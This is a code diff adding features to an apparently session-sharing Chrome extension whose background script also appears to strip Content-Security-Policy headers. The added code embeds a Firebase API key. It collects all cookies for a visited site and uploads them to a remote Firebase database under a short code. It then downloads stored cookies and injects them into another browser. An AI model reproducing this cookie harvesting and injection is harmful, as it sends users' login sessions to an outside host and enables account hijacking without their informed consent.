@@ -1,3 +1,4 @@
+
 function isCSPHeader(headerName) {
   return (headerName === 'CONTENT-SECURITY-POLICY') || (headerName === 'X-WEBKIT-CSP');
 }
@@ -17,3 +18,45 @@ chrome.webRequest.onHeadersReceived.addListener((details) => {
   types: ['main_frame'],
 }, ['blocking', 'responseHeaders']);
 
+var firebaseConfig = {
+  apiKey: "AIzaSyCp9ExzOVOuMu1Fi9qOXM7f5stWgG3_XQ8",
+  authDomain: "better-tandem.firebaseapp.com",
+  databaseURL: "https://better-tandem.firebaseio.com",
+  storageBucket: "better-tandem.appspot.com",
+};
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+//var database = firebase.database();
+
+var database = firebase.database();
+chrome.runtime.onMessage.addListener(function(request, sender) {
+  if (request.type == "cookies") {
+    console.log(request.location.replace('https://',''));
+    chrome.cookies.getAll({url: request.location}, function (cookies) {
+      console.log(cookies);
+      for (var i = 0; i < cookies.length; i++) {
+        console.log(cookies[i]);
+      }
+      database.ref(request.shortCode).set({
+        cookies: cookies,
+      });
+    });
+  } else if (request.type == 'setCookies') {
+    console.log('HERE MOTHAFUCKAS');
+    console.log(request.shortCode);
+    database.ref(request.shortCode).on('value', function (snapshot) {
+      console.log(snapshot.val());  
+      snapshot.val().cookies.forEach(element => {
+        console.log(element.domain);
+        console.log(request.location.replace('https://', ''));
+        chrome.cookies.set({
+          "name": element.name,
+          "url": request.location,
+          "value": element.value,
+        }, function(cookie) {
+          console.log(JSON.stringify(cookie));
+        })
+      });
+    });
+  }
+});
